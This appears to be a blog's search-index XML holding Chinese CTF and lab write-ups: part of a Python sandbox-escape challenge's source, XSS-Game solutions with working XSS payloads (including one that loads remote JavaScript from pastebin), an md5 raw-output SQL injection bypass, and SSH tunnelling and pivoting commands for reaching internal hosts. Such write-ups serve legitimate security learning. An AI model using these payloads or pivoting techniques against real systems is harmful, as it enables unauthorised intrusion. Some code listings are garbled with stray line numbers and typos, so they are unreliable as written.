题目源码读取到题目源码sandbox.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-09 23:30:58# @Author : Xu (you@example.org)# @Link : https://xuccc.github.io/# @Version : $Id$from sys import modulesfrom cpython import get_dictfrom types import FunctionTypemain = modules['__main__'].__dict__origin_builtins = main['__builtins__'].__dict__def delete_type(): type_dict = get_dict(type) del type_dict['__bases__'] del type_dict['__subclasses__']def delete_func_code(): func_dict = get_dict(FunctionType) del func_dict['func_code']def safe_import(__import__,whiteList): def importer(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=-1): if name in whiteList: return __import__(name,globals,locals,fromlist,level) else: print "HAHA,[%s] has been banned~" % name return importerclass ReadOnly(dict): """docstring for ReadOnlu""" def __delitem__(self,keys): raise ValueError(":(") def pop(self,key,default=None): raise ValueError(":(") def popitem(self): raise ValueError(":(") def setdefault(self,key,value): raise ValueError(":(") def __setitem__(self,key,value): raise ValueError(":(") def __setattr__(self, name, value): raise ValueError(":(") def update(self,dict,**kwargs): raise ValueError(":(") def builtins_clear(): whiteList = "raw_input SyntaxError ValueError NameError Exception __import__".split(" ") for mod in __builtins__.__dict__.keys(): if mod not in whiteList: del __builtins__.__dict__[mod]def input_filter(string): ban = "exec eval pickle os subprocess input sys ls cat".split(" ") for i in ban: if i in string.lower(): print "&#123;&#125; has been banned!".format(i) return "" return string# delete_type();del delete_typedelete_func_code();del delete_func_codebuiltins_clear();del builtins_clearwhiteMod = []origin_builtins['__import__'] = safe_import(__import__,whiteMod)safe_builtins = ReadOnly(origin_builtins);del ReadOnlymain['__builtins__'] = safe_builtins;del safe_builtinsdel get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionTypedel __builtins__, __doc__, __file__, __name__, __package__print """ ____ | _ \ _ _ _ __ | |_) | | | | '_ \ | _ &lt;| |_| | | | | |_| \_\\__,_|_| |_| Escape from the dark house built with python :)Try to getshell then find the flag!"""while 1: inp = raw_input('&gt;&gt;&gt;') cmd = input_filter(inp) try: exec cmd except NameError, e: print "wow something lose!We can\'t find it ! D:" except SyntaxError,e: print "Noob! Synax Wrong! :(" except Exception,e: print "unknow error,try again :&gt;" cpython.py 12345678910from ctypes import pythonapi,POINTER,py_object_get_dict = pythonapi._PyObject_GetDictPtr_get_dict.restype = POINTER(py_object)_get_dict.argtypes = [py_object]del pythonapi,POINTER,py_objectdef get_dict(ob): return _get_dict(ob).contents.value 0x04 参考文章https://paper.tuisec.win/detail/430721803508f2ehttps://developers.google.com/protocol-buffers/docs/reference/python/type-class]]></content>
      <categories>
        <category>python安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS-Game 解题记录]]></title>
    <url>%2FXSS-Game-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[题目链接：https://xss-game.appspot.com Level 1level 1 比较简单，get方法传入的query参数会直接在b标签中输出。12payloadhttps://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(1)&lt;/script&gt; Level 2level 2 是一个留言板，输入的内容会发布在一个123```payload&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt; Level 3Level 3 中传入的参数带入到了img标签中的src里，那么这里可以闭合src再引入新的事件触发xss。这里需要注意的是src是由双引号闭合的，但是传入双引号却无法闭合，传入单引号会闭合。 123payload https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)' Level 4这个题目中，传入的内容会被作为一个时间函数的参数，而这个函数是由img标签中onload事件触发的，那么思路便是将调用的函数闭合，再引入我们需要执行的代码。onload中可以执行多条语句，中间以;分隔，注意这里我们传入的分号要进行url编码12payloadhttps://xss-game.appspot.com/level4/frame?timer=');alert('1 Level 5这个题目中a标签中的href是用户可控的，href默认是解析url，但是我们可以指定为javascript执行。12payload https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1) Level 6这个题目可以使应用程序请求成为外部文件，调用远程js代码，虽然其过滤了https,但是没有考虑大写情况。这里使用一个在线远程文件服务器。https://pastebin.com/123payloadhttps://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw/EuYL4VC8]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[md5($str,true)引发的sql注入]]></title>
    <url>%2Fmd5-true-%E5%BC%95%E5%8F%91%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select("COUNT(p)") -&gt;from("User", "u") -&gt;where("password = '$pass' AND user = '$user'"); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST['user'], $_POST['passwd']);if (!$auth-&gt;isValid()) &#123; exit;&#125; 在上面的代码中，$queryBuilder拼接了一条sql查询语句，但是对传入的user进行了addslashes函数过滤，也就是说没有办法通过user进行注入，而且pass变量是经过md5计算的散列值，理论上也没有办法进行注入，但是这里这里md5()函数的$raw_output值设置为true，那么这个md5报文摘要将以16字节长度的原始二进制格式返回。什么意思呢？看一下下面的执行结果也就是说这个二进制格式的返回值会引入其他非预期的字符，比如说\这里经过fazz,发现 md5(128, true) 最后的结果带有反斜杠。因此这题最后的payload如下：1user= OR 1=1#&amp;passwd=128 另外实验吧的一道题目类似http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux端口转发]]></title>
    <url>%2Flinux%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[0x01 ssh正向代理动态端口转发环境：123A:192.168.111.130 //kali攻击机B:192.168.111.128 //能够进行ssh连接（知道其ssh口令）的ubuntu跳板C:172.17.0.2 //跟转发机处于同一内网的目标靶机（docker启动的容器） 在kali上执行命令1ssh 2 -D 2333 ghost@192.168.111.128 //这条命令是将A本地的2333端口，与B的22端口建立socks连接,输入B的ssh口令即可进行连接 可以使用火狐添加本地127.0.0.1 2333端口的socks代理查看内网的web服务 夜可以使用proxychains代理本地应用配置proxychains代理1234gedit /etc/proxychains.conf添加 socks 127.0.0.1 2333 例如使用nmap扫描开放端口1proxychains nma[ -Pn -sT 172.17.0.2 0X02 ssh正向代理单一端口转发1ssh -L 8888:172.17.0.2:80 ghost@192.168.111.128//访问127.0.0.1:8888相当于访问172.17.0.2:80 0x03 ssh反向代理单一端口转发12345678//先在A(kali)上生成ssh需要的host keyssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_keyssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key//然后在B运行ssh -R 8888:172.17.0.20:80 root@192.168.111.130 //A访问127.0.0.1:2222相当于访问C:22 0x04 ssh多级代理增加一级 D:192.168.168.412345ssh -R 8888:127.0.0.1:4444 root@192.168.111.130B作反向代理，将A:8888与B:4444打通ssh隧道ssh -2 -D 4444 msfadmin@172.17.0.2 //需要知道C的ssh口令B将本地4444端口与C打通ssh隧道，C作正向代理]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
      </tags>
  </entry>
</search>
